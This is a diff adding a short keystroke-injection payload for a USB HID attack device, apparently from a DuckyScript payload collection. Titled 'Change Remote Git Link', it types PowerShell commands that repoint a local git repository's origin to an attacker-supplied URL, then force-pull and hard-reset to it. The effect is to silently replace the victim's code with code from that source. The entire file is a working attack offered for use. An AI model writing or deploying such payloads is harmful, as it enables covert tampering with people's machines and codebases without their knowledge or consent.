@@ -1,0 +1,43 @@
+###########################################
+#                                         #
+# Title        : Change Remote Git Link   #
+# Author       : Aleff                    #
+# Version      : 1.0                      #
+# Category     : Execution                #
+# Target       : Windows 10-11/Linux      #
+#                                         #
+###########################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Internet Connection
+#  - git installed
+#  - Full path of the cloned repository
+#  - ExecutionPolicy Bypass if runned on Windows
+
+# VARIABLES
+# 1) Full path of the local repository i.e. 'home/user/Desktop'
+FULL-PATH='example'
+# 2) Link from which updates are to be downloaded so the new repository the Repository2
+NEW-GIT-LINK='example'
+# 3) Define the branch of the new repository Repository2, i.e. 'main'
+BRANCH='example'
+
+QUACK DELAY 1500
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING cd $FULL-PATH
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING git remote set-url origin $NEW-GIT-LINK
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING git pull --force origin $BRANCH
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING git reset --hard origin/$BRANCH; exit
+QUACK ENTER
